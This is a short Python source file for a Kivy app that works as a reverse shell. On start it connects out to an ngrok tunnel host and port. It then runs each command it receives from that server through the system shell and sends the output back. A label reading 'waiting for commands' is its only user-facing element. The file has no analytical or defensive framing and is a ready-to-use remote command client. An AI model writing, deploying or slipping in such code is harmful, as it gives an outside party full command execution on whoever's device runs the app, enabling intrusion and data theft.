import kivy
import socket
import subprocess
from kivy.app import App
from kivy.uix.label import Label
from kivy.uix.boxlayout import BoxLayout

class CommandClientApp(App):
    def build(self):
        self.target_host = "0.tcp.in.ngrok.io"  # Replace with the IP address of your server
        self.target_port = 10880  # Replace with the port number used by the server

        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.connect((self.target_host, self.target_port))

        self.layout = BoxLayout(orientation='vertical')
        self.label = Label(text="Connected to server. Waiting for commands...")
        self.layout.add_widget(self.label)

        self.execute_commands()  # Automatically start executing commands

        return self.layout

    def execute_commands(self):
        while True:
            command = self.client.recv(4096).decode("utf-8")  # Receive the command from the server

            if command.strip().lower() == 'quit':
                break

            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            response = result.stdout + result.stderr

            self.client.send(response.encode("utf-8"))  # Send the command output back to the server

    def on_stop(self):
        self.client.close()

if __name__ == "__main__":
    CommandClientApp().run()
